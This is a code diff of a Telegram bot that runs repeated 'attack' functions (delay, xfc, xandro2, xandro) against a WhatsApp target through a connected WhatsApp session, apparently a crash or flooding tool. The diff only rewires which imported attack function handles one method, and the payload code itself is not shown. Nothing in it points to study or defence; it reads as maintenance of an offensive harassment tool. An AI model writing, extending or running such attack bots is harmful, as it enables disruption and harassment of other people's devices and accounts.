@@ -90,7 +90,7 @@ const o = fs.readFileSync(`./o.jpg`)
 const bot = new Telegraf(BOT_TOKEN, { handlerTimeout: 9_000_000 });
 
 // Import fungsi dari func.js
-const { DileyHard, soulz, SeG, AboutYou, sleep } = require('./func');
+const { DileyHard, soulz, AboutYou, sleep } = require('./func');
 
 process.on('uncaughtException', (err) => {
     console.error('Uncaught Exception:', err);
@@ -506,7 +506,7 @@ bot.action(/attack_(delay|xfc|xandro2|xandro)_(.+)/, checkWhatsAppConnection, ch
                 if (!isWhatsAppConnected) break;
                 if (method === 'delay') await DileyHard(bydaah, target, true);
                 else if (method === 'xfc') await soulz(bydaah, target);
-                else if (method === 'xandro2') await SeG(bydaah, target, true);
+                else if (method === 'xandro2') await AboutYou(bydaah, target, true);
                 else if (method === 'xandro') await AboutYou(bydaah, target);
                 await sleep(3000);
             }
@@ -564,7 +564,7 @@ const handleAttackCommand = async (ctx, method) => {
                 if (!isWhatsAppConnected) break;
                 if (method === 'delay') await DileyHard(bydaah, target, true);
                 else if (method === 'xfc') await soulz(bydaah, target);
-                else if (method === 'xandro2') await SeG(bydaah, target, true);
+                else if (method === 'xandro2') await AboutYou(bydaah, target, true);
                 else if (method === 'xandro') await AboutYou(bydaah, target);
                 await sleep(3000);
             }
